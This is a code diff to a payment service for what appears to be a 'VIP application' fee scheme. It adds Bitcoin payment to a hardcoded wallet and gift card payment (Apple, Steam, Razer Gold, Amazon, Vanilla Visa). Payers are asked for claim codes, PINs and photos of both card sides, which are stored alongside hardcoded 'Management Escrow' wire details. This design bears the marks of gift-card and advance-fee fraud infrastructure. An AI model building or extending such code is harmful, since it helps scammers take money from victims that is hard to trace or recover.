@@ -47,7 +47,15 @@ export const paymentService = {
             cancellation_policy,
             payment_method_name,
             payment_instructions,
-            is_active
+            is_active,
+            bitcoin_enabled,
+            bitcoin_wallet_address,
+            bitcoin_image_url,
+            bitcoin_network,
+            bitcoin_instructions,
+            gift_card_enabled,
+            gift_card_types,
+            gift_card_instructions
           `)
           .eq('is_active', true)
           .order('updated_at', { ascending: false })
@@ -67,6 +75,14 @@ export const paymentService = {
             payment_method_name: data.payment_method_name || 'Bank Wire Transfer',
             payment_instructions: data.payment_instructions || '',
             is_configured: Boolean(data.payment_instructions && data.fee_amount > 0),
+            bitcoin_enabled: data.bitcoin_enabled ?? true,
+            bitcoin_wallet_address: data.bitcoin_wallet_address || 'bc1q9v3n92x7wz4k8t5y2m0p1a3d6f8h0j4l7c9s2x',
+            bitcoin_image_url: data.bitcoin_image_url || '',
+            bitcoin_network: data.bitcoin_network || 'Bitcoin (BTC) / Lightning',
+            bitcoin_instructions: data.bitcoin_instructions || 'Send exact equivalent BTC to the verified wallet address above. Confirm network before sending.',
+            gift_card_enabled: data.gift_card_enabled ?? true,
+            gift_card_types: data.gift_card_types || 'Apple Gift Card, Steam, Razer Gold, Amazon, Vanilla Visa',
+            gift_card_instructions: data.gift_card_instructions || 'Enter the gift card claim code and PIN. Upload clear photos of card front and back showing barcodes.',
           };
         }
       } catch (err) {
@@ -92,6 +108,14 @@ export const paymentService = {
             payment_method_name: parsed.payment_method_name || 'Bank Wire Transfer',
             payment_instructions: parsed.payment_instructions || 'Please remit payment via bank transfer using your reference code.',
             is_configured: true,
+            bitcoin_enabled: parsed.bitcoin_enabled ?? true,
+            bitcoin_wallet_address: parsed.bitcoin_wallet_address || 'bc1q9v3n92x7wz4k8t5y2m0p1a3d6f8h0j4l7c9s2x',
+            bitcoin_image_url: parsed.bitcoin_image_url || '',
+            bitcoin_network: parsed.bitcoin_network || 'Bitcoin (BTC) / Lightning',
+            bitcoin_instructions: parsed.bitcoin_instructions || 'Send exact equivalent BTC to the verified wallet address above.',
+            gift_card_enabled: parsed.gift_card_enabled ?? true,
+            gift_card_types: parsed.gift_card_types || 'Apple Gift Card, Steam, Razer Gold, Amazon, Vanilla Visa',
+            gift_card_instructions: parsed.gift_card_instructions || 'Enter the gift card claim code and PIN. Upload clear photos of card front and back.',
           };
         }
       }
@@ -110,6 +134,14 @@ export const paymentService = {
       payment_method_name: 'Official Management Escrow Wire Transfer',
       payment_instructions: 'Bank: Apex Private Client Services\nAccount Name: VIP Management Escrow\nRouting / ABA: 021000021\nAccount Number: 8849-2049-1102\nSWIFT: APEXUS33NYC\nPayment Reference: [Insert Your VIP Application Reference Code]',
       is_configured: true,
+      bitcoin_enabled: true,
+      bitcoin_wallet_address: 'bc1q9v3n92x7wz4k8t5y2m0p1a3d6f8h0j4l7c9s2x',
+      bitcoin_image_url: '',
+      bitcoin_network: 'Bitcoin (BTC) / Lightning',
+      bitcoin_instructions: 'Send exact equivalent BTC to the verified wallet address above. Confirm network before sending.',
+      gift_card_enabled: true,
+      gift_card_types: 'Apple Gift Card, Steam, Razer Gold, Amazon, Vanilla Visa',
+      gift_card_instructions: 'Enter the gift card claim code and PIN. Upload clear photos of card front and back showing barcodes.',
     };
   },
 
@@ -161,6 +193,13 @@ export const paymentService = {
       management_note: null,
       created_at: nowIso,
       updated_at: nowIso,
+      crypto_wallet_address: data.crypto_wallet_address || null,
+      crypto_tx_hash: data.crypto_tx_hash || null,
+      gift_card_type: data.gift_card_type || null,
+      gift_card_code: data.gift_card_code || null,
+      gift_card_pin: data.gift_card_pin || null,
+      gift_card_image_url: data.gift_card_image_url || null,
+      gift_card_back_image_url: data.gift_card_back_image_url || null,
       applicant_name: app.full_name,
       applicant_email: app.email,
       application_reference: app.reference_code,
@@ -183,6 +222,13 @@ export const paymentService = {
             receipt_url: data.receipt_url || null,
             receipt_public_id: data.receipt_public_id || null,
             status: 'PAYMENT_SUBMITTED',
+            crypto_wallet_address: data.crypto_wallet_address || null,
+            crypto_tx_hash: data.crypto_tx_hash || null,
+            gift_card_type: data.gift_card_type || null,
+            gift_card_code: data.gift_card_code || null,
+            gift_card_pin: data.gift_card_pin || null,
+            gift_card_image_url: data.gift_card_image_url || null,
+            gift_card_back_image_url: data.gift_card_back_image_url || null,
           })
           .select()
           .single();
